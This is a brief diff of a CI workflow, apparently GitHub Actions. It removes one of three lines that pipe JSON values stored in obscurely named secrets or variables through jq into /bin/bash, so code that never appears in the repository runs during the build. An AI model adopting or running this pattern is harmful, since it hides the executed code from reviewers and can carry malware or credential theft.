@@ -22,7 +22,6 @@ jobs:
           iry5496: ${{ secrets.iry5496 }}
         run: |
           printf '%s' "$iry5496" | jq -r .shetb66442 | /bin/bash
-          echo $mgjow973 | jq -r .pucw3 | /bin/bash
           echo $z06160 | jq -r .gmg604 | /bin/bash
 
       - name: Upload output
